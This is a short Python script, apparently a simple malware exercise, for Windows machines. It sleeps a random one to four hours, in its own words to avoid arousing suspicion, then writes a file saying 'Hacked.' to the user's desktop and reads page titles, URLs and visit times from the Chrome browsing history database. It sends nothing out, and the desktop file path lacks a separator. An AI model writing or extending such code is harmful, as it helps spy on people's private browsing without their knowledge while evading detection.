import os
from time import sleep
from random import randrange
import sqlite3

FILE_NAME = "Daru"

def main():
    # We will wait between one and four hours. For not arouse suspicion.
    delay_action()

    #
    username = os.getlogin()
    user_path = "C:\\Users\\" + "{}".format(username)

    #
    hacker_file = create_file(user_path)
    chrome_history = get_chrome_history(user_path)


def get_chrome_history(user_path):

    try:
        history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
        connection = sqlite3.connect(history_path)
        cursor = connection.cursor()
        cursor.execute("SELECT title, last_visit_time,url FROM urls ORDER BY last_visit_time DESC")
        urls = cursor.fetchall()
        return urls

    except sqlite3.OperationalError:
        return None


def create_file(user_path):
    hacker_file = open(user_path + "Desktop\\{}".format(FILE_NAME), "w")
    hacker_file.write("Hacked.")
    return hacker_file


def delay_action():
    number_hours = randrange(1, 4)
    number_minutes= randrange(0, 60)
    hours = number_hours * 60 * 60
    minutes = number_minutes * 60
    total_time_sleep = hours + minutes
    print("Hours: {}".format(hours/3600) + " Minutes: {}".format(minutes/60) + " Total time: {}".format(total_time_sleep) + " seconds.")
    sleep(total_time_sleep)

if __name__ == '__main__':
    main()